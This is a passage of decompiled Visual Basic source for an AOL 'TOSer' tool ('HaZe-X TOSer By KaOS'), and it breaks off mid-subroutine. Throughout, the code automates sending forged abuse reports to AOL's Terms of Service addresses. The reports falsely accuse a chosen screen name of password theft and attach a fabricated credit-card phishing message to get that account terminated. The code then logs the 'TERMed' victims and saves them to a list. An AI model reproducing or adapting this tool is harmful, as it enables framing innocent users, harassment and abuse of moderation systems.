l026C = extfn1520(32770&, "America Online")
l0270 = extfn24E0(l024A%, "Error")
Loop Until l0270 <> 0 Or l026C <> 0
If  l026C <> 0 Then
l0274 = extfn24E0(l026C, "OK")
l0278 = extfn1750(l0274, c0074, 0&, 0&)
l027C = extfn1750(l0274, c007C, 0&, 0&)
Call sub34B0(Combo1.Text & " is not Dead yet.")
l0282 = extfn16E0(l0280%, c022E, 0, 0)
l0286 = extfn16E0(l024C, c022E, 0, 0)
End If
If  l0270 <> 0 Then
l024A% = extfn1520("AOL Frame25", 0&)
l0280% = extfn24E0(l024A%, "Error")
l0282 = extfn16E0(l0280%, c022E, 0, 0)
l0286 = extfn16E0(l024C, c022E, 0, 0)
Call sub34B0(Combo1.Text & " has been TERMed")
For l028A% = 0 To Combo2.ListCount - 1
If  Combo2.ListIndex Like "*" & Combo1.Text & "*" Then : Exit Sub
Next l028A%
Combo2.AddItem Combo1 & "-" & Date & " " & Time
End If
End Sub

Sub Command3D8_Click ()
Dim l028C As Variant
If  Combo1.ListCount = 0 Then Exit Sub
l028C = Combo1.ListIndex
Combo1.RemoveItem (l028C)
Call sub34B0("The name has been Removed from the list")
End Sub

Sub Command3D9_Click ()
Dim l0290 As Integer
Dim l0294 As Variant
If  Combo2.ListCount = 0 Then
MsgBox "There are no names to save.", , "Error"
Exit Sub
End If
On Error GoTo L16E9E
CMDialog1.DialogTitle = "Save a INACTIVE List... ."
CMDialog1.Filter = "List Files (*.lst)| *.lst| All Files  (*.*)|*.*"
CMDialog1.Flags = &H1000&
CMDialog1.Action = 2
If  (CMDialog1.Filetitle <> "") Then
l0290 = 2
Open CMDialog1.Filename For Output As l0290
l0294 = 0
Do While l0294 < Combo2.ListCount
Print #l0290, Combo2.List(l0294)
l0294 = l0294 + 1
Loop
Close l0290
End If

L16E9E:
Call sub34B0("Dead List Saved.")
Exit Sub
End Sub

Sub COS_Click ()
Dim l0298 As Variant
Dim l029C As Variant
Dim l02A0 As Variant
Dim l02A4 As String
Dim l02A6 As Variant
Dim l02AA() As Integer
Dim l02B0 As Integer
Dim l02B2 As Variant
Dim l02B6 As Variant
Dim l02BA As String
Dim l02BC As Variant
Dim l02C0 As Variant
Dim l02C4 As Variant
Dim l02C8 As Variant
Dim l02CC As Variant
Dim l02D0 As Variant
Dim l02D4 As Variant
Dim l02D8 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0298 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l029C = 6
    l02A0 = Int(Rnd * l029C + 1)
      If  l02A0 = 1 Then l02A4$ = "" & Form1.Room & " asked for my password."
      If  l02A0 = 2 Then l02A4$ = "" & Form1.Room & " tried to hack my password."
      If  l02A0 = 3 Then l02A4$ = "Read!" & Form1.Room & " asked for my password."
      If  l02A0 = 4 Then l02A4$ = "Please do something about " & Form1.Room & "."
      If  l02A0 = 5 Then l02A4$ = "This guy wants my password:" & Form1.Room
      If  l02A0 = 6 Then l02A4$ = "Please help " & Form1.Room & " wants my password."
      If  l02A0 = 7 Then l02A4$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l02A6) Like "*KaOS*" Or UCase$(l02A6) Like "*NiPP*" Or UCase$(l02A6) Like "*CHOP*" Or UCase$(l02A6) Like "*LoRe*" Or UCase$(l02A6) Like "*CouNT*" Or UCase$(l02A6) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • COSRoomsDE"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l02B0% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l02B2 = extfn24E0(l02B0%, "Compose Mail")
DoEvents
Loop Until l02B2 <> 0
l02B6 = fn5D0(l02AA(), l02B2, "*", "_AOL_Edit", Null)
subF00 l02AA(1), "COSRoomsDE"
subF00 l02AA(3), "" & l02A4$
l02BA$ = Chr(10)
subF00 l02AA(4), "" & Room & ":" & " " & "" & Text1 & l02BA$ & l02BA$
l02BC = extfn24E0(l02B2, "Send")
l02C0 = extfn2518(l02B2, "_AOL_Icon")
l02C4 = extfn13D0(l02C0, 2)
l02C8 = extfn13D0(l02C4, 2)
l02CC = extfn1750(l02C0, c0074, 0, 0&)
l02D0 = extfn1750(l02C0, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l02D4 = 0 To Form1.Combo1.ListCount
l02D8$ = Form1.Combo1.List(l02D4)
If  Room = l02D8$ Then Exit Sub
Next
 Form1.Combo1.AddItem Room
End Sub

Sub dead_Click ()
Form1.Height = 3500
End Sub

Sub Exit_Click ()
subBB8 ("C:\HaZeTOS\Bstie6a.wav")
MsgBox "HaZe-X TOSer By KaOS", , "Goodbye from"
Call sub34B0("HaZe-X TOSer -De-Activated-")
End
End Sub

Sub sub3C98 ()
Dim l02DA As Variant
Dim l02DE As Variant
Dim l02E2 As Variant
Dim l02E6 As String
Dim l02E8 As Variant
Dim l02EC() As Integer
Dim l02F2 As Integer
Dim l02F4 As Variant
Dim l02F8 As Variant
Dim l02FC As String
Dim l02FE As Variant
Dim l0302 As Variant
Dim l0306 As Variant
Dim l030A As Variant
Dim l030E As Variant
Dim l0312 As Variant
Dim l0316 As Variant
Dim l031A As String
Randomize
For l02DA = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l02DE = 6
    l02E2 = Int(Rnd * l02DE + 1)
      If  l02E2 = 1 Then l02E6$ = "" & Form1.Room & " asked for my password."
      If  l02E2 = 2 Then l02E6$ = "" & Form1.Room & " tried to hack my password."
      If  l02E2 = 3 Then l02E6$ = "Read!" & Form1.Room & " asked for my password."
      If  l02E2 = 4 Then l02E6$ = "Please do something about " & Form1.Room & "."
      If  l02E2 = 5 Then l02E6$ = "This guy wants my password:" & Form1.Room
      If  l02E2 = 6 Then l02E6$ = "Please help " & Form1.Room & " wants my password."
      If  l02E2 = 7 Then l02E6$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l02E8) Like "*KaOS*" Or UCase$(l02E8) Like "*NiPP*" Or UCase$(l02E8) Like "*CHOP*" Or UCase$(l02E8) Like "*LoRe*" Or UCase$(l02E8) Like "*CouNT*" Or UCase$(l02E8) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSFiles1"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l02F2% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l02F4 = extfn24E0(l02F2%, "Compose Mail")
DoEvents
Loop Until l02F4 <> 0
l02F8 = fn5D0(l02EC(), l02F4, "*", "_AOL_Edit", Null)
subF00 l02EC(1), "TOSFiles1"
subF00 l02EC(3), "" & l02E6$
l02FC$ = Chr(10)
subF00 l02EC(4), "" & Room & ":" & " " & "" & Text1 & l02FC$ & l02FC$
l02FE = extfn24E0(l02F4, "Send")
l0302 = extfn2518(l02F4, "_AOL_Icon")
l0306 = extfn13D0(l0302, 2)
l030A = extfn13D0(l0306, 2)
l030E = extfn1750(l0302, c0074, 0, 0&)
l0312 = extfn1750(l0302, c007C, 0, 0&)
subF38 .4#
subFE0
For l0316 = 0 To Form1.Combo1.ListCount
l031A$ = Form1.Combo1.List(l0316)
If  Room = l031A$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub3CD0 ()
Dim l031C As Variant
Dim l0320 As Variant
Dim l0324 As Variant
Dim l0328 As String
Dim l032A As Variant
Dim l032E() As Integer
Dim l0334 As Integer
Dim l0336 As Variant
Dim l033A As Variant
Dim l033E As String
Dim l0340 As Variant
Dim l0344 As Variant
Dim l0348 As Variant
Dim l034C As Variant
Dim l0350 As Variant
Dim l0354 As Variant
Dim l0358 As Variant
Dim l035C As String
Randomize
For l031C = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0320 = 6
    l0324 = Int(Rnd * l0320 + 1)
      If  l0324 = 1 Then l0328$ = "" & Form1.Room & " asked for my password."
      If  l0324 = 2 Then l0328$ = "" & Form1.Room & " tried to hack my password."
      If  l0324 = 3 Then l0328$ = "Read!" & Form1.Room & " asked for my password."
      If  l0324 = 4 Then l0328$ = "Please do something about " & Form1.Room & "."
      If  l0324 = 5 Then l0328$ = "This guy wants my password:" & Form1.Room
      If  l0324 = 6 Then l0328$ = "Please help " & Form1.Room & " wants my password."
      If  l0324 = 7 Then l0328$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l032A) Like "*KaOS*" Or UCase$(l032A) Like "*NiPP*" Or UCase$(l032A) Like "*CHOP*" Or UCase$(l032A) Like "*LoRe*" Or UCase$(l032A) Like "*CouNT*" Or UCase$(l032A) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSFiles2"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l0334% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0336 = extfn24E0(l0334%, "Compose Mail")
DoEvents
Loop Until l0336 <> 0
l033A = fn5D0(l032E(), l0336, "*", "_AOL_Edit", Null)
subF00 l032E(1), "TOSFiles2"
subF00 l032E(3), "" & l0328$
l033E$ = Chr(10)
subF00 l032E(4), "" & Room & ":" & " " & "" & Text1 & l033E$ & l033E$
l0340 = extfn24E0(l0336, "Send")
l0344 = extfn2518(l0336, "_AOL_Icon")
l0348 = extfn13D0(l0344, 2)
l034C = extfn13D0(l0348, 2)
l0350 = extfn1750(l0344, c0074, 0, 0&)
l0354 = extfn1750(l0344, c007C, 0, 0&)
subF38 .4#
subFE0
For l0358 = 0 To Form1.Combo1.ListCount
l035C$ = Form1.Combo1.List(l0358)
If  Room = l035C$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub3D08 ()
Dim l035E As Variant
Dim l0362 As Variant
Dim l0366 As Variant
Dim l036A As String
Dim l036C As Variant
Dim l0370() As Integer
Dim l0376 As Integer
Dim l0378 As Variant
Dim l037C As Variant
Dim l0380 As String
Dim l0382 As Variant
Dim l0386 As Variant
Dim l038A As Variant
Dim l038E As Variant
Dim l0392 As Variant
Dim l0396 As Variant
Dim l039A As Variant
Dim l039E As String
Randomize
For l035E = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0362 = 6
    l0366 = Int(Rnd * l0362 + 1)
      If  l0366 = 1 Then l036A$ = "" & Form1.Room & " asked for my password."
      If  l0366 = 2 Then l036A$ = "" & Form1.Room & " tried to hack my password."
      If  l0366 = 3 Then l036A$ = "Read!" & Form1.Room & " asked for my password."
      If  l0366 = 4 Then l036A$ = "Please do something about " & Form1.Room & "."
      If  l0366 = 5 Then l036A$ = "This guy wants my password:" & Form1.Room
      If  l0366 = 6 Then l036A$ = "Please help " & Form1.Room & " wants my password."
      If  l0366 = 7 Then l036A$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l036C) Like "*KaOS*" Or UCase$(l036C) Like "*NiPP*" Or UCase$(l036C) Like "*CHOP*" Or UCase$(l036C) Like "*LoRe*" Or UCase$(l036C) Like "*CouNT*" Or UCase$(l036C) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSFiles3"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l0376% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0378 = extfn24E0(l0376%, "Compose Mail")
DoEvents
Loop Until l0378 <> 0
l037C = fn5D0(l0370(), l0378, "*", "_AOL_Edit", Null)
subF00 l0370(1), "TOSFiles3"
subF00 l0370(3), "" & l036A$
l0380$ = Chr(10)
subF00 l0370(4), "" & Room & ":" & " " & "" & Text1 & l0380$ & l0380$
l0382 = extfn24E0(l0378, "Send")
l0386 = extfn2518(l0378, "_AOL_Icon")
l038A = extfn13D0(l0386, 2)
l038E = extfn13D0(l038A, 2)
l0392 = extfn1750(l0386, c0074, 0, 0&)
l0396 = extfn1750(l0386, c007C, 0, 0&)
subF38 .4#
subFE0
For l039A = 0 To Form1.Combo1.ListCount
l039E$ = Form1.Combo1.List(l039A)
If  Room = l039E$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub3D40 ()
Dim l03A0 As Variant
Dim l03A4 As Variant
Dim l03A8 As Variant
Dim l03AC As String
Dim l03AE As Variant
Dim l03B2() As Integer
Dim l03B8 As Integer
Dim l03BA As Variant
Dim l03BE As Variant
Dim l03C2 As String
Dim l03C4 As Variant
Dim l03C8 As Variant
Dim l03CC As Variant
Dim l03D0 As Variant
Dim l03D4 As Variant
Dim l03D8 As Variant
Dim l03DC As Variant
Dim l03E0 As String
Randomize
For l03A0 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l03A4 = 6
    l03A8 = Int(Rnd * l03A4 + 1)
      If  l03A8 = 1 Then l03AC$ = "" & Form1.Room & " asked for my password."
      If  l03A8 = 2 Then l03AC$ = "" & Form1.Room & " tried to hack my password."
      If  l03A8 = 3 Then l03AC$ = "Read!" & Form1.Room & " asked for my password."
      If  l03A8 = 4 Then l03AC$ = "Please do something about " & Form1.Room & "."
      If  l03A8 = 5 Then l03AC$ = "This guy wants my password:" & Form1.Room
      If  l03A8 = 6 Then l03AC$ = "Please help " & Form1.Room & " wants my password."
      If  l03A8 = 7 Then l03AC$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l03AE) Like "*KaOS*" Or UCase$(l03AE) Like "*NiPP*" Or UCase$(l03AE) Like "*CHOP*" Or UCase$(l03AE) Like "*LoRe*" Or UCase$(l03AE) Like "*CouNT*" Or UCase$(l03AE) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSFiles4"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l03B8% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l03BA = extfn24E0(l03B8%, "Compose Mail")
DoEvents
Loop Until l03BA <> 0
l03BE = fn5D0(l03B2(), l03BA, "*", "_AOL_Edit", Null)
subF00 l03B2(1), "TOSFiles4"
subF00 l03B2(3), "" & l03AC$
l03C2$ = Chr(10)
subF00 l03B2(4), "" & Room & ":" & " " & "" & Text1 & l03C2$ & l03C2$
l03C4 = extfn24E0(l03BA, "Send")
l03C8 = extfn2518(l03BA, "_AOL_Icon")
l03CC = extfn13D0(l03C8, 2)
l03D0 = extfn13D0(l03CC, 2)
l03D4 = extfn1750(l03C8, c0074, 0, 0&)
l03D8 = extfn1750(l03C8, c007C, 0, 0&)
subF38 .4#
subFE0
For l03DC = 0 To Form1.Combo1.ListCount
l03E0$ = Form1.Combo1.List(l03DC)
If  Room = l03E0$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub files_Click ()
Dim l03E2 As Variant
Dim l03E6 As Variant
Dim l03EA As Variant
Dim l03EE As String
Dim l03F0 As Variant
Dim l03F4() As Integer
Dim l03FA As Integer
Dim l03FC As Variant
Dim l0400 As Variant
Dim l0404 As String
Dim l0406 As Variant
Dim l040A As Variant
Dim l040E As Variant
Dim l0412 As Variant
Dim l0416 As Variant
Dim l041A As Variant
Dim l041E As Variant
Dim l0422 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l03E2 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l03E6 = 6
    l03EA = Int(Rnd * l03E6 + 1)
      If  l03EA = 1 Then l03EE$ = "" & Form1.Room & " asked for my password."
      If  l03EA = 2 Then l03EE$ = "" & Form1.Room & " tried to hack my password."
      If  l03EA = 3 Then l03EE$ = "Read!" & Form1.Room & " asked for my password."
      If  l03EA = 4 Then l03EE$ = "Please do something about " & Form1.Room & "."
      If  l03EA = 5 Then l03EE$ = "This guy wants my password:" & Form1.Room
      If  l03EA = 6 Then l03EE$ = "Please help " & Form1.Room & " wants my password."
      If  l03EA = 7 Then l03EE$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l03F0) Like "*KaOS*" Or UCase$(l03F0) Like "*NiPP*" Or UCase$(l03F0) Like "*CHOP*" Or UCase$(l03F0) Like "*LoRe*" Or UCase$(l03F0) Like "*CouNT*" Or UCase$(l03F0) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSFiles1"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l03FA% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l03FC = extfn24E0(l03FA%, "Compose Mail")
DoEvents
Loop Until l03FC <> 0
l0400 = fn5D0(l03F4(), l03FC, "*", "_AOL_Edit", Null)
subF00 l03F4(1), "TOSFiles1"
subF00 l03F4(3), "" & l03EE$
l0404$ = Chr(10) + Chr(3)
subF00 l03F4(4), "" & Room & ":" & " " & "" & Text1 & l0404$ & l0404$
l0406 = extfn24E0(l03FC, "Send")
l040A = extfn2518(l03FC, "_AOL_Icon")
l040E = extfn13D0(l040A, 2)
l0412 = extfn13D0(l040E, 2)
l0416 = extfn1750(l040A, c0074, 0, 0&)
l041A = extfn1750(l040A, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l041E = 0 To Form1.Combo1.ListCount
l0422$ = Form1.Combo1.List(l041E)
If  Room = l0422$ Then Exit Sub
Next
 Form1.Combo1.AddItem Room
End Sub

Sub Form_Load ()
Dim l0424 As Integer
Dim l0426 As String
Dim l0428 As String
Dim l042A As Variant
Dim l042E As String
Dim l0430 As Variant
For l0424% = 0 To 25
l0426$ = String$(256, " ")
l0430 = extfn2F98(l0424%, l0426$) & l0428$
If  Len(Trim$(l0426$)) <= 1 Then Exit For
l0426$ = Left$(Trim$(l0426$), Len(Trim(l0426$)) - 1)
For l042A = 0 To Room.ListCount - 1
l042E$ = Room.List(l042A)
If l0426$ = l042E$ GoTo L1A624
Next l042A
If  InStr(UCase$(l0426$), "MTV") <> 0 Then GoTo L1A624
If  InStr(UCase$(l0426$), "TOS") <> 0 Then GoTo L1A624
If  InStr(UCase$(l0426$), "GUIDE") <> 0 Then GoTo L1A624
If  InStr(UCase$(l0426$), "AOL") <> 0 Then GoTo L1A624
If  InStr(UCase$(l0426$), "TLA") <> 0 Then GoTo L1A624
If  InStr(UCase$(l0426$), "ROR") <> 0 Then GoTo L1A624
If  InStr(UCase$(l0426$), "CAT") <> 0 Then GoTo L1A624
If  InStr(UCase$(l0426$), "HOST") <> 0 Then GoTo L1A624
If l0426$ = fn7C8() GoTo L1A624
Room.AddItem l0426$
L1A624:
Next l0424%
Text1 = "Hello valued AOL customer.My name is John Copland and i work with the America Online Billing corperation.Due to a massive data curruption in Sector 4g9e we need you to respond to us with you FULL credit card info.Thank you.;)"
Panel3D4 = "Welcome " & fn7C8()
Panel3D5 = "1"
Call sub34B0("HaZe-X TOSer -Activated-")
subE20 Me
End Sub

Sub general_Click ()
Dim l043A As Variant
Dim l043E As Variant
Dim l0442 As Variant
Dim l0446 As String
Dim l0448 As Variant
Dim l044C() As Integer
Dim l0452 As Integer
Dim l0454 As Variant
Dim l0458 As Variant
Dim l045C As String
Dim l045E As Variant
Dim l0462 As Variant
Dim l0466 As Variant
Dim l046A As Variant
Dim l046E As Variant
Dim l0472 As Variant
Dim l0476 As Variant
Dim l047A As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l043A = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l043E = 6
    l0442 = Int(Rnd * l043E + 1)
      If  l0442 = 1 Then l0446$ = "" & Form1.Room & " asked for my password."
      If  l0442 = 2 Then l0446$ = "" & Form1.Room & " tried to hack my password."
      If  l0442 = 3 Then l0446$ = "Read!" & Form1.Room & " asked for my password."
      If  l0442 = 4 Then l0446$ = "Please do something about " & Form1.Room & "."
      If  l0442 = 5 Then l0446$ = "This guy wants my password:" & Form1.Room
      If  l0442 = 6 Then l0446$ = "Please help " & Form1.Room & " wants my password."
      If  l0442 = 7 Then l0446$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0448) Like "*KaOS*" Or UCase$(l0448) Like "*NiPP*" Or UCase$(l0448) Like "*CHOP*" Or UCase$(l0448) Like "*LoRe*" Or UCase$(l0448) Like "*CouNT*" Or UCase$(l0448) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSGeneral"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l0452% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0454 = extfn24E0(l0452%, "Compose Mail")
DoEvents
Loop Until l0454 <> 0
l0458 = fn5D0(l044C(), l0454, "*", "_AOL_Edit", Null)
subF00 l044C(1), "TOSGeneral"
subF00 l044C(3), "" & l0446$
l045C$ = Chr(10) + Chr(3)
subF00 l044C(4), "" & Room & ":" & " " & "" & Text1 & l045C$ & l045C$
l045E = extfn24E0(l0454, "Send")
l0462 = extfn2518(l0454, "_AOL_Icon")
l0466 = extfn13D0(l0462, 2)
l046A = extfn13D0(l0466, 2)
l046E = extfn1750(l0462, c0074, 0, 0&)
l0472 = extfn1750(l0462, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l0476 = 0 To Form1.Combo1.ListCount
l047A$ = Form1.Combo1.List(l0476)
If  Room = l047A$ Then Exit Sub
Next
 Form1.Combo1.AddItem Room
End Sub

Sub gfx_Click ()
Dim l047C As Variant
Dim l0480 As Variant
Dim l0484 As Variant
Dim l0488 As String
Dim l048A As Variant
Dim l048E() As Integer
Dim l0494 As Integer
Dim l0496 As Variant
Dim l049A As Variant
Dim l049E As String
Dim l04A0 As Variant
Dim l04A4 As Variant
Dim l04A8 As Variant
Dim l04AC As Variant
Dim l04B0 As Variant
Dim l04B4 As Variant
Dim l04B8 As Variant
Dim l04BC As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l047C = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0480 = 6
    l0484 = Int(Rnd * l0480 + 1)
      If  l0484 = 1 Then l0488$ = "" & Form1.Room & " asked for my password."
      If  l0484 = 2 Then l0488$ = "" & Form1.Room & " tried to hack my password."
      If  l0484 = 3 Then l0488$ = "Read!" & Form1.Room & " asked for my password."
      If  l0484 = 4 Then l0488$ = "Please do something about " & Form1.Room & "."
      If  l0484 = 5 Then l0488$ = "This guy wants my password:" & Form1.Room
      If  l0484 = 6 Then l0488$ = "Please help " & Form1.Room & " wants my password."
      If  l0484 = 7 Then l0488$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l048A) Like "*KaOS*" Or UCase$(l048A) Like "*NiPP*" Or UCase$(l048A) Like "*CHOP*" Or UCase$(l048A) Like "*LoRe*" Or UCase$(l048A) Like "*CouNT*" Or UCase$(l048A) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·² • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·² • Method • TOSGFX10"
sub30B0 "•-^v•HaZe-X²·² • Phrase • " & Panel3D5
Call sub3278
End If
l0494% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0496 = extfn24E0(l0494%, "Compose Mail")
DoEvents
Loop Until l0496 <> 0
l049A = fn5D0(l048E(), l0496, "*", "_AOL_Edit", Null)
subF00 l048E(1), "TOSGFX10"
subF00 l048E(3), "" & l0488$
l049E$ = Chr(10) + Chr(3)
subF00 l048E(4), "" & Room & ":" & " " & "" & Text1 & l049E$ & l049E$
l04A0 = extfn24E0(l0496, "Send")
l04A4 = extfn2518(l0496, "_AOL_Icon")
l04A8 = extfn13D0(l04A4, 2)
l04AC = extfn13D0(l04A8, 2)
l04B0 = extfn1750(l04A4, c0074, 0, 0&)
l04B4 = extfn1750(l04A4, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l04B8 = 0 To Form1.Combo1.ListCount
l04BC$ = Form1.Combo1.List(l04B8)
If  Room = l04BC$ Then Exit Sub
Next
Combo1.AddItem Room
End Sub

Sub sub3E58 ()
Dim l04BE As Variant
Dim l04C2 As Variant
Dim l04C6 As Variant
Dim l04CA As String
Dim l04CC As Variant
Dim l04D0() As Integer
Dim l04D6 As Integer
Dim l04D8 As Variant
Dim l04DC As Variant
Dim l04E0 As String
Dim l04E2 As Variant
Dim l04E6 As Variant
Dim l04EA As Variant
Dim l04EE As Variant
Dim l04F2 As Variant
Dim l04F6 As Variant
Dim l04FA As Variant
Dim l04FE As String
Randomize
For l04BE = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l04C2 = 6
    l04C6 = Int(Rnd * l04C2 + 1)
      If  l04C6 = 1 Then l04CA$ = "" & Form1.Room & " asked for my password."
      If  l04C6 = 2 Then l04CA$ = "" & Form1.Room & " tried to hack my password."
      If  l04C6 = 3 Then l04CA$ = "Read!" & Form1.Room & " asked for my password."
      If  l04C6 = 4 Then l04CA$ = "Please do something about " & Form1.Room & "."
      If  l04C6 = 5 Then l04CA$ = "This guy wants my password:" & Form1.Room
      If  l04C6 = 6 Then l04CA$ = "Please help " & Form1.Room & " wants my password."
      If  l04C6 = 7 Then l04CA$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l04CC) Like "*KaOS*" Or UCase$(l04CC) Like "*NiPP*" Or UCase$(l04CC) Like "*CHOP*" Or UCase$(l04CC) Like "*LoRe*" Or UCase$(l04CC) Like "*CouNT*" Or UCase$(l04CC) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSGFX"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l04D6% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l04D8 = extfn24E0(l04D6%, "Compose Mail")
DoEvents
Loop Until l04D8 <> 0
l04DC = fn5D0(l04D0(), l04D8, "*", "_AOL_Edit", Null)
subF00 l04D0(1), "TOSGFX"
subF00 l04D0(3), "" & l04CA$
l04E0$ = Chr(10)
subF00 l04D0(4), "" & Room & ":" & " " & "" & Text1 & l04E0$ & l04E0$
l04E2 = extfn24E0(l04D8, "Send")
l04E6 = extfn2518(l04D8, "_AOL_Icon")
l04EA = extfn13D0(l04E6, 2)
l04EE = extfn13D0(l04EA, 2)
l04F2 = extfn1750(l04E6, c0074, 0, 0&)
l04F6 = extfn1750(l04E6, c007C, 0, 0&)
subF38 .4#
subFE0
For l04FA = 0 To Form1.Combo1.ListCount
l04FE$ = Form1.Combo1.List(l04FA)
If  Room = l04FE$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub3E90 ()
Dim l0500 As Variant
Dim l0504 As Variant
Dim l0508 As Variant
Dim l050C As String
Dim l050E As Variant
Dim l0512() As Integer
Dim l0518 As Integer
Dim l051A As Variant
Dim l051E As Variant
Dim l0522 As String
Dim l0524 As Variant
